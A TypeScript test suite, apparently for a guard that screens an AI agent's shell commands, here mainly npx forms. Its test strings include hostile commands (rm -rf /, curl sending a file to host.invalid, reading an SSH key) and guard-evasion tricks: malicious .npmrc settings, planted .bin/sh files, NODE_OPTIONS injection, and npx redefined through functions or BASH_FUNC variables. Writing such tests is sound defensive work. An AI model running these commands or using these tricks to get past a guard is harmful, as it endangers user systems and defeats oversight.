    for (const c of ['name=foo; grep -rn "$name" src', 'a=one; b=uno; sed -i "s/$a/$b/" g', 'd=src; ls "$d" && cat "$d/a.ts"', 'name=src; cat <<EOF\n$name\nEOF\nls "$name"', 'name=src; echo {a,b} "$name"']) {
      const p = read(c);
      assert.notEqual(p.judged, p.text, c);
      process.env["BASH_FUNC_x%%"] = "() { :; }";
      try {
        assert.equal(read(c).text, p.text, c);
        assert.equal(read(c).judged, read(c).text, c);
      } finally {
        delete process.env["BASH_FUNC_x%%"];
      }
    }
  });
});

describe("awk, second pass: from the first print on, a > or a | is output whatever follows it", () => {
  expect("classify", [
    "awk '{ print > 1 }' f",
    "awk 'BEGIN { print \"x\" > 2 }'",
    "awk '{ print > 1 \".sh\" }' f",
    "awk '{ print >1 }' f",
    "awk '{ print >> 1 }' f",
    "awk '{ printf \"%s\\n\", $1 > 2 }' f",
    "awk '{ print | 1 }' f",
    "awk '{ print > $2 }' f",
    "awk '{ print > (1) }' f",
    "awk '{ print > -1 }' f",
    "awk '{ print $1 }\n$2 > 3' f",
    "awk -e '{ print $1 }' -e '$2 > 3' f",
  ]);
  // No print before it: a comparison.
  expect("allow", ["awk '$3 > 1' f", "awk 'NR > 1 { n++ } END { print n }' f", "awk '$1 >= 2 { print }' f", "awk '{ if ($1 > 2) print $1 }' f", "awk 'NR==1 || NR>3' f"]);
});

// ---- third pass: the maintainer's decision on finding 28 ----
//
// "`npx` never allowed by rule: model if the tool is installed in the project, otherwise ask."
// The reading of npm (decide.ts, npxReading) now draws one line only, between the model and an
// ask; no input ends as a rule allow.

const TOOLS = ["tsc", "eslint", "prettier", "jest", "vitest"];
// `where`: a project of its own; each command with its expected ending and, if given, what the
// reason must say.
const npxCases = (where: () => string, want: Want, cases: (string | [string, RegExp])[]) => {
  for (const c of cases) {
    const [command, reason] = typeof c === "string" ? [c, undefined] : c;
    test(`${want}: ${JSON.stringify(command)}`, async () => {
      const got = await outcomeIn(where(), command);
      assert.equal(got.kind, want, `${command}: ${got.reason}`);
      if (reason) assert.match(got.reason, reason);
    });
  }
};

describe("r4 28, third pass (1): npx is never a rule allow: the model where the project has the tool, an ask elsewhere", () => {
  let dir = "";
  before(() => {
    dir = project("npx3", { "package.json": PKG({ devDependencies: { typescript: "5.9.3" } }), "src/a.ts": "export const a = 1;\n", "packages/a/package.json": PKG({ name: "a" }) }, TOOLS);
  });
  // The everyday forms, the tool installed in the project: the model, with a reason that names
  // the tool and the file npx runs.
  npxCases(() => dir, "classify", [
    ["npx tsc --noEmit", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx eslint .", /npx eslint: the project has node_modules\/\.bin\/eslint/],
    ["npx prettier --check .", /npx prettier: the project has node_modules\/\.bin\/prettier/],
    ["npx jest", /npx jest: the project has node_modules\/\.bin\/jest/],
    ["npx vitest run", /npx vitest: the project has node_modules\/\.bin\/vitest/],
    ["npx --no-install tsc", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx --no tsc", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx tsc --noEmit 2>&1 | head -20", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx tsc && echo ok", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx tsc --noEmit > /dev/null 2>&1", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx tsc -p tsconfig.json", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx tsc || echo failed", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx tsc; echo $?", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["{ npx tsc; }", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["! npx tsc", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["if npx tsc --noEmit; then echo ok; fi", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["bash -c 'npx tsc --noEmit'", /npx tsc: the project has node_modules\/\.bin\/tsc/],
    ["npx tsc 2>/dev/null; npx eslint . >/dev/null", /npx (tsc|eslint): the project has node_modules\/\.bin\//],
    ["x=tsc; npx \"$x\"", /npx tsc: the project has node_modules\/\.bin\/tsc/],
  ]);
  // Nothing of that name installed: npx would download a package. An option of npx that names
  // a package, or a word that is no plain program name: the same.
  npxCases(() => dir, "ask", [
    ["npx cowsay hi", /npx cowsay: the project has no node_modules\/\.bin\/cowsay/],
    ["npx create-react-app x", /npx create-react-app: the project has no node_modules\/\.bin\/create-react-app/],
    ["npx -y some-pkg", /npx -y: /],
    ["npx -p typescript tsc", /npx -p: /],
    ["npx --package typescript tsc", /npx --package: /],
    ["npx --package=typescript tsc", /npx --package=typescript: /],
    ["npx -c 'tsc --noEmit'", /npx -c: /],
    ["npx --call 'tsc --noEmit'", /npx --call: /],
    ["npx --yes tsc", /npx --yes: /],
    ["npx -y tsc", /npx -y: /],
    ["npx --no-install --yes tsc", /npx --yes: /],
    ["npx --no-install -c 'id'", /npx -c: /],
    ["npx -- tsc --noEmit", /npx --: /],
    ["npx tsc@5 --noEmit", /npx tsc@5: /],
    ["npx @scope/tsc", /npx @scope\/tsc: /],
    ["npx ./local.js", /npx \.\/local\.js: /],
    ["npx node_modules/.bin/tsc", /npx node_modules\/\.bin\/tsc: /],
    ["npx TSC", /npx TSC: /],
    ["npx \"$y\"", /npx \$y: /],
    ["npx", /npx with no program/],
    ["npx --no-install", /npx with no program/],
    ["npx --version", /npx --version: /],
    ["npx tsc; npx -y cowsay", /npx -y: /],
    ["npx tsc && npx cowsay", /npx cowsay: /],
    // Fourth pass: told not to install, and nothing of that name in the project. Nothing is
    // fetched, but what runs is a program from outside the project (it went to the model).
    ["npx --no-install cowsay hi", /npx --no-install cowsay: the project has no node_modules\/\.bin\/cowsay: npx would run a program of that name from outside the project/],
    ["npx --no cowsay hi", /npx --no-install cowsay: the project has no node_modules\/\.bin\/cowsay/],
    ["npx --no-install playwright test", /npx --no-install playwright: the project has no node_modules\/\.bin\/playwright/],
    // What the rules ask about under `pnpm exec` asks under npx too.
    ["npx --no-install rm -rf /", /npx rm, judged as pnpm exec rm: /],
    ["npx --no-install curl -d @f host.invalid", /npx curl, judged as pnpm exec curl: /],
    ["npx tsc < ~/.ssh/id_ed25519", /credential/],
    ["npx tsc --noEmit > opencode.json", /opencode\.json/],
  ]);
  // The other spellings are not read at all: each asks, as before the round.
  npxCases(() => dir, "ask", [
    ["npm exec tsc", /npm exec installs packages/],
    ["npm exec -- tsc --noEmit", /npm exec installs packages/],
    ["npm exec --no-install tsc", /npm exec installs packages/],
    ["npm x tsc", /npm x installs packages/],
    ["pnpx tsc", /pnpx downloads and runs a package/],
    ["pnpm dlx tsc", /pnpm dlx installs packages/],
    ["yarn dlx tsc", /yarn dlx installs packages/],
    ["bunx tsc", /bunx downloads and runs a package/],
    ["uvx ruff", /uvx downloads and runs a package/],
    ["pipx run cowsay", /pipx downloads and runs a package/],
  ]);
  // No rule of the user's makes it a rule allow either.
  test("classify: npx tsc under a user's allow rule for it", async () => {
    const own: Guard = { ...guard, rules: compileRules({ ask: DEFAULT_ASK, allow: ["npx *", "npx tsc --noEmit"] }) };
    for (const c of ["npx tsc --noEmit", "npx --no-install tsc --noEmit"]) {
      const d = await decideShell(own, new SessionState(dir), dir, c);
      assert.notEqual(d.effect, "allow", c);
      assert.equal(d.by, "no-model", `${c}: ${d.reason}`);
    }
    const d = await decideShell(own, new SessionState(dir), dir, "npx cowsay hi");
    assert.equal(d.effect, "ask", d.reason);
  });
  // (The sweep over every form is in the fourth pass, (7): each is exactly an ask or the model.)
});

describe("r4 28, third pass (2): what stands in front of npx changes nothing about the reading", () => {
  let dir = "";
  before(() => {
    dir = project("npx3-front", { "package.json": PKG(), "src/a.ts": "export const a = 1;\n", "packages/a/package.json": PKG({ name: "a" }) }, TOOLS);
  });
  // An assignment the guard holds harmless, a wrapper the rules look through, a subshell, a cd
  // inside the project: read as the bare form is.
  npxCases(() => dir, "classify", [
    ["CI=true npx jest", /npx jest: the project has node_modules\/\.bin\/jest/],
    ["NODE_ENV=test npx jest", /npx jest: the project has/],
    ["FOO=1 npx tsc", /npx tsc: the project has/],
    ["timeout 60 npx tsc", /npx tsc: the project has/],
    ["timeout 60 npx tsc --noEmit", /npx tsc: the project has/],
    ["env npx tsc", /npx tsc: the project has/],
    ["env CI=1 npx jest", /npx jest: the project has/],
    ["time npx tsc", /npx tsc: the project has/],
    ["time npx --no-install tsc", /npx tsc: the project has/],
    ["nice npx tsc", /npx tsc: the project has/],
    ["nice -n 5 npx tsc", /npx tsc: the project has/],
    ["command npx tsc", /npx tsc: the project has/],
    ["nohup npx tsc", /npx tsc: the project has/],
    ["(cd src && npx tsc)", /npx tsc: the project has/],
    ["(cd src && npx tsc --noEmit)", /npx tsc: the project has/],
    ["cd src && npx tsc --noEmit", /npx tsc: the project has/],
    ["cd packages/a && npx tsc", /npx tsc: the project has/],
    ["cd -- src && npx tsc", /npx tsc: the project has/],
    // Several places, each inside the project.
    ["true || cd src; npx tsc", /npx tsc: the project has/],
    // A place the check cannot tell: the model.
    ["cd \"$d\" && npx tsc", /npx tsc, where the check cannot tell which directory it runs in/],
    ["pushd src && npx tsc", /npx tsc, where the check cannot tell which directory it runs in/],
  ]);
  // ... and the same form asks behind each of them, with the reading's own reason.
  npxCases(() => dir, "ask", [
    ["CI=true npx cowsay hi", /npx cowsay: the project has no node_modules\/\.bin\/cowsay/],
    ["timeout 60 npx cowsay hi", /npx cowsay: the project has no/],
    ["env npx -y some-pkg", /npx -y: /],
    ["timeout 60 npx -p typescript tsc", /npx -p: /],
    ["time npx cowsay", /npx cowsay: the project has no/],
    ["nice npx cowsay", /npx cowsay: the project has no/],
    ["command npx cowsay", /npx cowsay: the project has no/],
    ["(cd src && npx cowsay hi)", /npx cowsay: the project has no/],
    ["cd packages/a && npx cowsay", /npx cowsay: the project has no/],
    // A place that is not the project; of several places, the strictest.
    ["cd /tmp && npx tsc --noEmit", /npx outside the project/],
    ["cd .. && npx tsc", /npx outside the project/],
    ["(cd .. && npx --no-install tsc)", /npx outside the project/],
    ["timeout 60 env CI=1 npx tsc; cd .. && FOO=1 npx tsc", /npx outside the project/],
    ["true || cd ..; npx tsc", /npx outside the project/],
    // The words alone decide where the place is not known.
    ["cd \"$d\" && npx -y cowsay", /npx -y: /],
    ["cd \"$d\" && npx --no-install rm -rf /", /judged as pnpm exec rm/],
    // An assignment that is not harmless, a setting of npm's given in the call.
    ["NODE_OPTIONS=--require=./x.js npx tsc", /NODE_OPTIONS/],
    ["npm_config_script_shell=./evilsh npx tsc", /npm_config_script_shell/],
    ["env Npm_Config_Script_Shell=./evilsh npx tsc", /Npm_Config_Script_Shell/],
    // A path to a file called npx is that file, not the npx the shell finds by name (fourth
    // pass: an absolute path too): the ask from before the round.
    ["./npx tsc", /^npx downloads and runs a package$/],
    ["/usr/bin/npx tsc", /^npx downloads and runs a package$/],
    ["/usr/bin/npx cowsay", /^npx downloads and runs a package$/],
    // Behind a program that hands it words of its own.
    ["xargs npx tsc", /^npx downloads and runs a package$/],
    ["sudo npx tsc", /sudo/],
  ]);
});

describe("r4 28, third pass (3): what npm reads that the check cannot vouch for asks", () => {
  // The nine inputs of the variant check of the second pass (xcheck/orchestrator/
  // xcheck-d2.test.mts), each a rule allow there while the real npx ran something else, and the
  // read review's points. None is a rule allow; each asks.
  for (const [name, npmrc] of [
    ["cr-after-key", "registry=https://registry.npmjs.org/\rscript-shell=./evilsh\n"],
    ["cr-after-comment", "# comment\rscript-shell=./evilsh\n"],
    ["cr-node-options", "; comment\rnode-options=--require ./pre.js\n"],
    ["cr-package", "registry=https://registry.npmjs.org/\rpackage=evil-pkg\n"],
  ] as [string, string][]) {
    test(`ask: a project .npmrc with a lone carriage return as its line break (${name})`, async () => {
      const dir = project(`npx3-${name}`, { "package.json": PKG(), ".npmrc": npmrc, evilsh: "#!/bin/sh\n" });
      for (const c of ["npx tsc --noEmit", "npx --no-install tsc --noEmit"]) {
        const got = await outcomeIn(dir, c);
        assert.equal(got.kind, "ask", `${c}: ${got.reason}`);
        assert.match(got.reason, /\.npmrc sets (script-shell|node-options|package)/);
      }
    });
  }
  test("classify: a project .npmrc with CR LF line ends and settings that change nothing", async () => {
    const dir = project("npx3-crlf", { "package.json": PKG(), ".npmrc": "registry=https://registry.npmjs.org/\r\nsave-exact=true\r\n" });
    const got = await outcomeIn(dir, "npx tsc --noEmit");
    assert.equal(got.kind, "classify", got.reason);
    assert.match(got.reason, /npx tsc: the project has/);
  });
  test("ask: node_modules/.bin/sh in the project (npm starts the program with it)", async () => {
    const dir = project("npx3-bin-sh", { "package.json": PKG() }, ["tsc", "sh"]);
    const got = await outcomeIn(dir, "npx tsc --noEmit");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, /node_modules\/\.bin\/sh/);
  });
  test("ask: node_modules/.bin/node in the project (the program's #!/usr/bin/env node finds it)", async () => {
    const dir = project("npx3-bin-node", { "package.json": PKG() }, ["tsc", "node"]);
    const got = await outcomeIn(dir, "npx tsc --noEmit");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, /node_modules\/\.bin\/node/);
  });
  test("ask: node_modules/.bin/sh in a directory above the project, and in the directory the command runs in", async () => {
    write(path.join(base, "npx3-above", "node_modules", ".bin", "sh"), STAND_IN, 0o755);
    const dir = project("npx3-above/p", { "package.json": PKG(), "src/a.ts": "" });
    const got = await outcomeIn(dir, "npx tsc --noEmit");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, /npx3-above\/node_modules\/\.bin\/sh/);
    const sub = project("npx3-sub", { "package.json": PKG(), "src/a.ts": "" });
    write(path.join(sub, "src", "node_modules", ".bin", "sh"), STAND_IN, 0o755);
    assert.equal((await outcomeIn(sub, "cd src && npx tsc")).kind, "ask");
    assert.equal((await outcomeIn(sub, "npx tsc")).kind, "classify");
  });
  test("ask: npx after an approved `npm install ./dep` whose dependency has a bin named sh", async () => {
    const dir = project("npx3-approved", { "package.json": PKG(), "dep/package.json": JSON.stringify({ name: "dep", version: "1.0.0", bin: { sh: "x.js" } }), "dep/x.js": "#!/bin/sh\n" });
    // (npm makes a package's bin executable when it links it. Fourth pass: one that is not is
    // passed over.)
    fs.chmodSync(path.join(dir, "dep", "x.js"), 0o755);
    const session = new SessionState(dir);
    const d = await decideShell(guard, session, dir, "npm install ./dep");
    assert.equal(d.effect, "ask");
    d.approve?.();
    // (what npm then leaves: node_modules/.bin/sh -> ../../dep/x.js)
    fs.symlinkSync("../../dep/x.js", path.join(dir, "node_modules", ".bin", "sh"));
    const got = await outcomeIn(dir, "npx tsc --noEmit", session);
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, /node_modules\/\.bin\/sh/);
  });
  test("ask: a relative npm_config_userconfig is read where npm reads it, in the directory the command runs in", async () => {
    const dir = project("npx3-userconfig", { "package.json": PKG(), "uc.npmrc": "script-shell=./evilsh\n", evilsh: "#!/bin/sh\n" });
    const was = process.env.npm_config_userconfig;
    process.env.npm_config_userconfig = "uc.npmrc";
    try {
      const got = await outcomeIn(dir, "npx tsc --noEmit");
      assert.equal(got.kind, "ask", got.reason);
      assert.match(got.reason, /uc\.npmrc sets script-shell/);
    } finally {
      if (was === undefined) delete process.env.npm_config_userconfig;
      else process.env.npm_config_userconfig = was;
    }
  });
  // The read review: a key npm's reader decodes and this one does not, in the user's own file
  // (where only the settings that move npm are looked for); a .bin file the shell would pass over.
  test("ask: a key of the user's .npmrc that the check cannot read as npm does", async () => {
    const dir = project("npx3-user-key", { "package.json": PKG() });
    const user = path.join(os.homedir(), ".npmrc");
    for (const text of ["\"script\\u002dshell\"=./evilsh\n", "script-shell #comment=./evilsh\n", "registry=https://registry.npmjs.org/\rscript-shell=./evilsh\n"]) {
      write(user, text);
      try {
        const got = await outcomeIn(dir, "npx tsc --noEmit");
        assert.equal(got.kind, "ask", `${JSON.stringify(text)}: ${got.reason}`);
        assert.match(got.reason, /\.npmrc/);
      } finally {
        fs.rmSync(user);
      }
    }
  });
  test("ask: a node_modules/.bin file that is not executable (the shell npm starts would look further along PATH)", async () => {
    const dir = project("npx3-noexec", { "package.json": PKG() });
    fs.chmodSync(path.join(dir, "node_modules", ".bin", "tsc"), 0o644);
    const got = await outcomeIn(dir, "npx tsc --noEmit");
    assert.equal(got.kind, "ask", got.reason);
    assert.match(got.reason, /node_modules\/\.bin\/tsc/);
  });
});

describe("r4 28, third pass (4): a command of the same call that names node_modules before the npx asks", () => {
  let dir = "";
  before(() => {
    dir = project("npx3-rm", { "package.json": PKG(), "src/a.ts": "" }, TOOLS);
  });
  // The reading looks at the disk before the call; after the deletion the real npx would fetch
  // a package (xcheck/orchestrator/npx-rm.mts).
  npxCases(() => dir, "ask", [
    ["rm node_modules/.bin/tsc && npx tsc --noEmit", /names node_modules/],
    ["rm -rf node_modules; npx tsc", /names node_modules/],
    ["rm -rf node_modules; npx tsc --noEmit", /names node_modules/],
    ["rm -rf node_modules/.bin && npx tsc", /names node_modules/],
    ["unlink node_modules/.bin/tsc && npx --no-install tsc", /names node_modules/],
    ["mv node_modules nm && npx tsc", /names node_modules/],
    ["(rm node_modules/.bin/tsc); npx tsc", /names node_modules/],
    ["rm node_modules/.bin/tsc | npx tsc", /names node_modules/],
    ["rm node_modules/.bin/tsc & npx tsc", /names node_modules/],
    ["rm -f ./node_modules/.bin/tsc; timeout 60 npx tsc", /names node_modules/],
    ["cd src && rm -rf ../node_modules && npx tsc", /names node_modules/],
    ["bash -c 'rm -rf node_modules' && npx tsc", /names node_modules/],
    ["rm -rf node_modules; bash -c 'npx tsc'", /names node_modules/],
    ["bash -c 'rm -rf node_modules; npx tsc'", /names node_modules/],
    ["if true; then rm -rf node_modules; fi; npx tsc", /names node_modules/],
    ["printf 'x' > node_modules/.bin/tsc; npx tsc", /names node_modules/],
    ["rm -rf \"$PWD/node_modules\"; npx tsc", /names node_modules/],
  ]);
  npxCases(() => dir, "classify", [
    ["rm -rf dist && npx tsc --noEmit", /npx tsc: the project has/],
    ["rm -rf dist build && npx tsc --noEmit && echo ok", /npx tsc: the project has/],
    // The npx's own words.
    ["npx tsc node_modules/x/index.d.ts", /npx tsc: the project has/],
  ]);
  // Fifth pass (the maintainer's rule: any other part of the call that spells node_modules asks,
  // wherever it stands): a command that stands after the npx. It went to the model.
  npxCases(() => dir, "ask", [["npx tsc && ls node_modules/.cache", /names node_modules/]]);
});

describe("r4 28, third pass (5): one reason, whatever the session wrote", () => {
  let dir = "";
  before(() => {
    dir = project("npx3-session", { "package.json": PKG(), "src/a.ts": "" }, TOOLS);
  });
  // `npx jest` went to the model as a runner once the session had written a file, with the
  // runner's reason. It goes to the model anyway now, and says the same thing in both cases.
  for (const [first, second] of [
    ["printf 'x' > notes.txt", "npx tsc --noEmit"],
    ["printf 'x' > jest.config.js", "npx jest"],
    ["printf 'x' > vitest.config.js", "npx --no-install vitest run"],
    ["printf 'x' > .eslintrc.js", "cd src && npx eslint ."],
    ["printf 'x' > src/b.ts", "timeout 60 npx tsc"],
  ]) {
    test(`classify with the same reason in a fresh session and after ${JSON.stringify(first)}: ${JSON.stringify(second)}`, async () => {
      const fresh = await outcomeIn(dir, second);
      assert.equal(fresh.kind, "classify", fresh.reason);
      const session = new SessionState(dir);
      assert.equal((await outcomeIn(dir, first, session)).kind, "allow");
      const after = await outcomeIn(dir, second, session);
      assert.equal(after.kind, "classify", after.reason);
      assert.equal(after.reason, fresh.reason);
      assert.doesNotMatch(after.reason, /this session wrote/);
    });
  }
  test("classify with the same reason when the write stands in the same call", async () => {
    const fresh = await outcomeIn(dir, "npx jest");
    for (const c of ["printf 'x' > jest.config.js && npx jest", "npx jest > out.txt", "npx jest | tee out.txt"]) {
      const got = await outcomeIn(dir, c);
      assert.equal(got.kind, "classify", `${c}: ${got.reason}`);
      assert.equal(got.reason, fresh.reason, c);
    }
  });
  // The model is still shown what the session wrote (a stub for the model server, on loopback).
  test("the files the session wrote go to the model with the command", async () => {
    const seen: string[] = [];
    const server = http.createServer((req, res) => {
      let text = "";
      req.on("data", (c) => (text += c));
      req.on("end", () => {
        seen.push(text);
        res.setHeader("content-type", "application/json");
        res.end(JSON.stringify({ answers: { risky: { noul: 0.01 } } }));
      });
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    try {
      const model: Guard = { ...guard, useClassifier: true, classifier: { ...DEFAULT_CLASSIFIER, endpoint: `http://127.0.0.1:${(server.address() as { port: number }).port}` } };
      const session = new SessionState(dir);
      const first = await decideShell(model, session, dir, "printf 'module.exports = {}\\n' > jest.config.js");
      assert.equal(first.effect, "allow", first.reason);
      fs.writeFileSync(path.join(dir, "jest.config.js"), "module.exports = { marker: 1 }\n");
      seen.length = 0;
      const d = await decideShell(model, session, dir, "npx jest");
      assert.equal(d.by, "model", d.reason);
      assert.equal(seen.length, 1);
      assert.match(seen[0], /npx jest/);
      assert.match(seen[0], /jest\.config\.js contains:/);
      assert.match(seen[0], /marker: 1/);
    } finally {
      server.close();
      fs.rmSync(path.join(dir, "jest.config.js"), { force: true });
    }
  });
});

// ---- fourth pass: the line between the model and an ask for npx ----
//
// The third pass was checked by a reading and by a variant check that ran every "model" decision
// with a real, offline npx (xcheck/orchestrator/xcheck-d3.test.mts holds its inputs; the ones a
// point of this pass holds are taken over below, with this pass's expectation). No npx form is
// a rule allow. What follows is the line between the model and an ask.

const NPX_HAS = (tool: string) => new RegExp(`\\(npx ${tool}: the project has node_modules/\\.bin/${tool}, so npx downloads nothing and runs that file through npm; no rule allows an npx, so it is left to the model\\)$`);
// The model for the npx's reason, or (group B's seventh pass) for the reason of a script an
// interpreter is handed in the same call.
const NPX_OR_SCRIPT = /\((npx tsc: the project has node_modules\/\.bin\/tsc, so npx downloads nothing|runs [\w.\/-]+\.js, whose change time cannot be read\)$)/;
const NPX_OLD_ASK = /^npx downloads and runs a package$/;
// Fifth pass: the one rule's reason (it was the fourth pass's "another command names node_modules,
// the tool in it or a directory that holds it" or "a file npm reads").
const NPX_OTHER = /^npx [\w.-]+ in a call that names node_modules outside the arguments of this npx \((.+)\): the tool was looked for before the call runs, so any other mention of node_modules asks$/s;
const exec = (file: string) => fs.chmodSync(file, 0o755);

describe("r4 28, fourth pass (1): --no-install and --no with nothing of that name in the project ask", () => {
  let dir = "";
  let bare = "";
  let inner = "";
  before(() => {
    dir = project("npx4-noinst", { "package.json": PKG(), "src/a.ts": "" }, TOOLS);
    bare = project("npx4-bare", { "package.json": PKG(), "src/a.ts": "" }, []);
    // The tool only in a directory above the project.
    write(path.join(base, "npx4-above", "node_modules", ".bin", "tsc"), STAND_IN, 0o755);
    inner = project("npx4-above/p", { "package.json": PKG() }, []);
  });
  // The variant check ran these with the real npx (offline): each ran the program of that name
  // from npm's global bin directory, which was /usr/bin.
  const OUTSIDE = (tool: string) => new RegExp(`^npx --no-install ${tool}: the project has no node_modules/\\.bin/${tool}: npx would run a program of that name from outside the project`);
  npxCases(() => dir, "ask", [
    ["npx --no-install id", OUTSIDE("id")],
    ["npx --no-install sh -c 'id'", /^npx (--no-install sh: the project has no|sh, judged as pnpm exec sh)/],
    ["npx --no-install python3 -c 'print(1)'", OUTSIDE("python3")],
    ["npx --no-install node -e 'console.log(1)'", OUTSIDE("node")],
    ["npx --no-install find . -maxdepth 0 -exec id \\;", OUTSIDE("find")],
    ["npx --no-install bash -c 'id'", /^npx (--no-install bash: the project has no|bash, judged as pnpm exec bash)/],
    ["npx --no cowsay hi", OUTSIDE("cowsay")],
    ["npx --no-install cowsay hi", OUTSIDE("cowsay")],
    ["CI=1 npx --no-install cowsay", OUTSIDE("cowsay")],
    ["timeout 5 npx --no cowsay", OUTSIDE("cowsay")],
    ["cd src && npx --no-install cowsay", OUTSIDE("cowsay")],
  ]);
  npxCases(() => bare, "ask", [
    ["npx --no-install tsc", OUTSIDE("tsc")],
    ["npx --no tsc --noEmit", OUTSIDE("tsc")],
    ["npx tsc", /^npx tsc: the project has no node_modules\/\.bin\/tsc, so npx would download a package of that name and run it$/],
  ]);
  npxCases(() => inner, "ask", [["npx --no-install tsc", OUTSIDE("tsc")]]);
  // With the tool installed, both are the model.
  npxCases(() => dir, "classify", [
    ["npx --no-install tsc", NPX_HAS("tsc")],
    ["npx --no tsc --noEmit", NPX_HAS("tsc")],
    ["npx --no-install eslint .", NPX_HAS("eslint")],
  ]);
});

describe("r4 28, fourth pass (2): only the bare word npx is read as npx", () => {
  let dir = "";
  before(() => {
    dir = project("npx4-path", { "package.json": PKG(), "bin/npx": "#!/bin/sh\necho EVIL\n", npx: "#!/bin/sh\necho EVIL\n" }, TOOLS);
    exec(path.join(dir, "bin", "npx"));
    exec(path.join(dir, "npx"));
  });
  // A path to a file named npx runs that file. Each got the installed-tool reason and went to
  // the model in the third pass; each has the ask from before the round again.
  for (const c of ["@/bin/npx tsc --noEmit", "CI=1 @/bin/npx tsc", "timeout 5 @/bin/npx tsc", "@/npx tsc", "/tmp/nonexistent/npx tsc", "/opt/anything/npx tsc", "/tmp/npx tsc", "/usr/bin/npx tsc", "/usr/bin/../bin/npx tsc", "CI=1 /usr/bin/npx tsc", "timeout 5 /usr/bin/npx tsc", "env /usr/bin/npx tsc", "/usr/bin/npx --no-install tsc", "./bin/npx tsc", "bin/npx tsc", "./npx tsc", "../npx4-path/npx tsc", "~/bin/npx tsc", "\"$PWD\"/bin/npx tsc", "/usr/bin/npx cowsay"]) {
    test(`ask: ${JSON.stringify(c)}`, async () => {
      const got = await outcomeIn(dir, c.replaceAll("@", dir));
      assert.equal(got.kind, "ask", got.reason);
      assert.match(got.reason, NPX_OLD_ASK);
    });
  }
  // The word alone is read, also quoted (the shell finds it by name all the same).
  npxCases(() => dir, "classify", [
    ["npx tsc", NPX_HAS("tsc")],
    ["'npx' tsc", NPX_HAS("tsc")],
    ["\\npx tsc", NPX_HAS("tsc")],
  ]);
});

describe("r4 28, fourth pass (3): a function or an alias named npx, defined in the call, asks", () => {
  let dir = "";
  before(() => {
    dir = project("npx4-fn", { "package.json": PKG(), "defs.sh": "npx() { echo EVIL; }\n" }, TOOLS);
  });
  const DEFINED = /^the call defines a function or an alias named npx: the word npx then runs that, not npm's npx$/;
  npxCases(() => dir, "ask", [
    ["function npx { echo EVIL; }; npx tsc", DEFINED],
    ["function npx() { echo EVIL; }; npx --no-install tsc", DEFINED],
    ["function npx () { echo EVIL; }; npx tsc", DEFINED],
    ["function npx { echo EVIL; }; CI=1 npx tsc", DEFINED],
    ["function npx { echo EVIL; }; time npx tsc", DEFINED],
    ["function npx { echo EVIL; }; timeout 5 npx tsc", DEFINED],
    ["function npx { echo EVIL; }\nnpx tsc", DEFINED],
    ["function  npx\n{ echo EVIL; }; npx tsc", DEFINED],
    ["npx() { echo EVIL; }; npx tsc", DEFINED],
    ["npx () { echo EVIL; }; npx tsc", DEFINED],
    ["npx ( ) { echo EVIL; }; npx --no tsc", DEFINED],
    ["npx() ( echo EVIL ); npx tsc", DEFINED],
    ["npx tsc; function npx { echo EVIL; }; npx tsc", DEFINED],
    ["if true; then function npx { echo EVIL; }; fi; npx tsc", DEFINED],
    ["bash -c 'function npx { echo EVIL; }; npx tsc'", DEFINED],
  ]);
  // An alias, and code the call reads into the shell, asked already (each for its own reason).
  npxCases(() => dir, "ask", [
    ["alias npx='echo EVIL'; npx tsc", /alias/],
    ["alias -- npx='echo EVIL'; npx tsc", /alias/],
    ["eval 'function npx { echo EVIL; }'; npx tsc", /code for eval that defines a function/],
  ]);
  // A function of another name changes nothing.
  npxCases(() => dir, "classify", [
    ["function build { npx tsc; }; build", /\(shell function\)$/],
    ["mynpx() { echo x; }; npx tsc", NPX_HAS("tsc")],
  ]);
  // A function bash would import from the environment (`BASH_FUNC_npx%%`). The shell hook drops
  // such a variable from every shell the plugin sees (sandbox.ts, SHELL_OWN; index.ts deletes
  // it from the event's environment), unless the user's `sandboxKeepEnv` names it. The decision
  // asks where the plugin's own environment holds one, whichever is the case.
  test("ask: npx with BASH_FUNC_npx%% in the plugin's environment; the shell hook drops the variable", async () => {
    process.env["BASH_FUNC_npx%%"] = "() { echo EVIL; }";
    try {
      for (const c of ["npx tsc", "CI=1 npx --no-install tsc", "timeout 5 npx tsc"]) {
        const got = await outcomeIn(dir, c);
        assert.equal(got.kind, "ask", `${c}: ${got.reason}`);
        assert.match(got.reason, /^the environment holds a function named npx \(BASH_FUNC_npx%%\): the word npx may run that, not npm's npx$/);
      }
    } finally {
      delete process.env["BASH_FUNC_npx%%"];
    }
    assert.equal((await outcomeIn(dir, "npx tsc")).kind, "classify");
    const { keep, dropped } = envKept({ "BASH_FUNC_npx%%": "() { echo EVIL; }", EDITOR: "vi" }, []);
    assert.ok(dropped.includes("BASH_FUNC_npx%%") && !keep.includes("BASH_FUNC_npx%%"));
    assert.ok(shellOwn("BASH_FUNC_npx%%"));
  });
});

describe("r4 28, fourth pass (4): another command of the call that names what the reading rests on asks", () => {
  let dir = "";
  let linked = "";
  before(() => {
    dir = project(
      "npx4-same",
      { "package.json": PKG({ scripts: { reset: "rm -rf node_modules" } }), "src/a.ts": "", "packages/a/package.json": PKG({ name: "a" }), Makefile: "reset:\n\trm -rf node_modules\n", "reset.sh": "#!/bin/sh\nrm -rf node_modules\n", "other.json": "{}\n", "evil.sh": "#!/bin/sh\n" },
      [...TOOLS, "vite"],
    );
    exec(path.join(dir, "reset.sh"));
    write(path.join(dir, "node_modules", ".cache", "x"), "");
    write(path.join(dir, "node_modules", "typescript", "package.json"), PKG({ name: "typescript" }));
    // A project as npm leaves it: .bin/tsc a link into the tool's package; and a second name
    // for node_modules.
    linked = project("npx4-linked", { "package.json": PKG(), "src/a.ts": "" }, []);
